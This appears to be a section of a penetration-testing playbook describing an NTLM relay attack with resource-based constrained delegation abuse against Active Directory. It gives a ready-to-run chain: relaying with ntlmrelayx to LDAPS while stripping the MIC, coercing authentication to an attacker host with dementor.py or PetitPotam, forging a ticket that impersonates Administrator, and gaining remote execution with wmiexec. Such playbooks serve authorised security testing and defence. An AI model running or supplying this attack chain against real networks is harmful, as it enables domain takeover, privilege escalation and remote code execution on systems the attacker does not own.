## NTLM relay attack using RBCD abuse [t-ad-ntlm-coerced-rbcd_abuse]

NTLM relay attack using RBCD abuse. Can be used only for NTLMv1 or in case of unpatched Drop the MIC CVE CVE-2019-1040 or CVE-2019-1166. Requires MachineAccountQuota > 0.

### 4.1.1 Prepare a tool to relay the authentication request



{% code overflow="wrap" %}
```bash
impacket-ntlmrelayx -t "ldaps://dc01.domain.local" --remove-mic -smb2support --delegate-access
```
{% endcode %}

### 4.1.2 Force the target host to authenticate




**option 1: dementor.py**

{% code overflow="wrap" %}
```bash
python2 dementor.py -d hpbank.local -u da -p 'P@ssw0rd' <attacker_ip> <target_hostname>
```
{% endcode %}


**option 2: PetitPotam.py (topotam)**

{% code overflow="wrap" %}
```bash
PetitPotam.py -u da -p 'P@ssw0rd' -d domain.local <attacker_ip> <target_hostname> -pipe all
```
{% endcode %}

### 4.1.3 Craft a service ticket for an impersonated user



{% code overflow="wrap" %}
```bash
impacket-getST -spn cifs/ADCS.domain.local -impersonate Administrator domain.local/'PEPQTPEY$':'3<J8...' -dc-ip 192.168.0.122
KRB5CCNAME=Administrator.ccache impacket-wmiexec -k -no-pass ADCS.HPBANK.LOCAL

```
{% endcode %}

